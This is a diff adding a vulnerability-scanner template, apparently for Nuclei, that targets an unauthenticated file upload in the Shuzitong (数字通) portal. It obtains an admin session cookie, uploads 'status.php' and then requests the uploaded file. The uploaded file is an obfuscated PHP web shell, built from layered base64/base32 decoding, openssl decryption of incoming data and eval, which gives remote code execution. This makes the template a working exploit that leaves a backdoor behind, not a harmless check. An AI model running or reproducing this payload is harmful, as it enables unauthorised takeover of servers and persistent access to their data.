@@ -1,0 +1,102 @@
+id: Shuzitong-unauth-fileupload
+info:
+  name: 数字通未授权任意文件上传
+  author: status
+  severity: critical
+  description: 数字通未授权任意文件上传。icon_hash="34193182"
+  tags: shuzitong,fileupload,unauth
+
+requests:
+  - raw:
+      - |
+        POST /portal/default/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Accept-Encoding: gzip, deflate
+        Content-Length: 22
+
+        userID=admin&flag=rone
+
+      - |
+        POST /sys/mobile/setting HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Go-http-client/1.1
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryjWvMVSgOWHCulSTf
+        Cookie: §GOASESSID§
+        Accept-Encoding: gzip, deflate
+
+        ------WebKitFormBoundaryjWvMVSgOWHCulSTf
+        Content-Disposition: form-data; name="MobileApplication[cert]"; filename="status.php"
+        Content-Type: application/octet-stream
+
+        Hello Administrator!
+        <?php
+        @error_reporting(0);
+        session_start();
+            $govS= base64_decode(base64_decode("TVRaaFkyRmpZekExWVdGbVlXWTI=")).chr(55);
+            $_SESSION['k']=$govS;
+            session_write_close();
+            $govb8tKn=base64_decode(base64_decode("YjJKMWFHRnZjbkJtTlhWM05EUmtkbTl4"));
+            $govTP0lqX='openssl';
+            $gov0=govLXsBPvi($govb8tKn);
+            $govN7Bmexm7Guj2="file_g".chr(101)."t_"."con".base64_decode("dGVudHM=");
+            $govASHBu1694Gcl0EL=$govN7Bmexm7Guj2($gov0);
+            if(!extension_loaded($govTP0lqX))
+            {
+                $govX8s8wWq1nrSC="base64_"."decode";
+                $govASHBu1694Gcl0EL=$govX8s8wWq1nrSC("/*X]-DP@i*/".$govASHBu1694Gcl0EL);
+                for($i=0;$i<strlen($govASHBu1694Gcl0EL);$i++) {
+                        
+                    }
+            }
+            $govASHBu1694Gcl0EL=openssl_decrypt($govASHBu1694Gcl0EL, base64_decode(base64_decode("UVVWVE1UST0=")).chr(56), $govS);
+            $govdYapT6=explode('|',$govASHBu1694Gcl0EL);
+            $govBRp=$govdYapT6[1];
+            class govr6K{public function __invoke($p) {eval("/*X]-DP@i*/".$p."");}}
+            @call_user_func(new govr6K(),$govBRp);
+            function govLXsBPvi($govms8PC){
+            $di15 = '';
+            $govz5UAp6m5 = (2334+17784)*intval(chr(48));
+            $govc5z1k = (4813-5585)*intval(chr(48));
+            for ($i = 0, $j = strlen($govms8PC); $i < $j; $i++){
+                $govz5UAp6m5 <<= 5;
+                if ($govms8PC[$i] >= 'a' && $govms8PC[$i] <= 'z'){
+                    $govz5UAp6m5 += (ord($govms8PC[$i]) - 97);
+                } elseif ($govms8PC[$i] >= '2' && $govms8PC[$i] <= '7') {
+                    $govz5UAp6m5 += (24 + $govms8PC[$i]);
+                } else {
+                    exit(1);
+                }
+                $govc5z1k += 5;
+                while ($govc5z1k >= 8){
+                    $govc5z1k -= 8;
+                    $di15 .= chr($govz5UAp6m5 >> $govc5z1k);
+                    $govz5UAp6m5 &= ((1 << $govc5z1k) - 1);}}
+            return $di15;}
+        ?>
+        ------WebKitFormBoundaryjWvMVSgOWHCulSTf--
+
+      - |
+        GET /static/seal/status.php  HTTP/1.1
+        Host: {{Hostname}}
+
+    extractors:
+      - type: regex
+        name: GOASESSID
+        part: header
+        internal: true
+        regex:
+          - "GOASESSID=.{0,};"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "Hello Administrator!"
+        part: body
+        condition: and
+      - type: status
+        status:
+          - 200
+
+# Enhanced by mp on 2022/05/23
